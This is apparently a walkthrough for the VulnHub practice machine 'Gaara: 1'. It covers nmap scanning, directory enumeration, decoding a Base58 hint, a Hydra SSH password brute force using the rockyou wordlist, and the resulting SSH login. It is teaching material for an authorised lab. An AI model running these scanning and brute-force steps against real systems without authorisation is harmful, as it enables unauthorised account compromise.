# Gaara: 1

- **Machine:** Gaara: 1
- **Download:** https://www.vulnhub.com/entry/gaara-1,629/

![](771-1.png)

---

## Setup

- Import the `.ova` file into VirtualBox.
- Click **Finish**.
- Start the virtual machine.

---

# Network Scanning

## Find the Target IP Address

```bash
nmap -sn 192.168.2.0/24
```

![](771-2.png)

---

## Full Port Scan

Run a comprehensive Nmap scan to enumerate all open ports, services, operating system details, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.234
```

![](771-3.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.234
```

```bash
nmap -sC -sV -A 192.168.2.234
```

---

## HTTP Enumeration

This command performs an aggressive scan and runs the `http-enum` NSE script to identify interesting web directories.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.234
```

---

# Web Enumeration

Visit the target website:

- http://192.168.2.234

---

## Directory Enumeration

Use Dirsearch to discover hidden directories.

```bash
dirsearch -u http://192.168.2.234 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![](771-4.png)

---

## Explore the Discovered Directory

Visit:

- http://192.168.2.234/Cryoserver

![](771-5.png)

---

## Discover Hidden Endpoints

Navigate to the following hidden directories:

```text
/Temari
/Kazekage
/iamGaara
```

- http://192.168.2.234/Temari
- http://192.168.2.234/Kazekage
- http://192.168.2.234/iamGaara

---

## Decode the Hidden Value

Inside the `/iamGaara` page, an encoded string is discovered.

```text
f1MgN9mTf9SNbzRygcU
```

![](771-6.png)

Decode the Base58-encoded value.

```bash
python3 -c "import base58; print(base58.b58decode('f1MgN9mTf9SNbzRygcU').decode())"
```

![](771-7.png)

The decoded output reveals useful authentication information.

---

# SSH Password Brute Force (Lab)

> **Lab note:** The following steps are intended only for an authorized practice machine such as this VulnHub VM.

Use Hydra to recover the SSH password for the discovered user.

```bash
hydra -l gaara -P /opt/rockyou.txt ssh://192.168.2.234
```

![](771-8.png)

Hydra successfully identifies the valid password.

---

# SSH Access

Authenticate to the SSH service.

```bash
ssh gaara@192.168.2.234
```

![](771-9.png)

Successful SSH login.

![](771-10.png)

---

# Impact

- Hidden web directories disclosed sensitive information.
- Base58-encoded data exposed authentication-related information.
- Weak SSH credentials allowed unauthorized access.
- Initial shell access to the target system was achieved.

---

# Key Learning

- Always enumerate hidden directories during web reconnaissance.
- Base58 is an encoding format and should not be considered secure storage for secrets.
- Decode every discovered encoded string during enumeration.
- Hydra can efficiently validate weak SSH passwords.
- Combining web enumeration with password attacks can quickly lead to initial access.

---

# Summary

The assessment began with directory enumeration, which uncovered several hidden endpoints within the web application. One of these pages contained a Base58-encoded string that revealed useful authentication information after decoding. Using the discovered username, Hydra successfully recovered the SSH password, allowing authentication to the target system and providing an initial shell.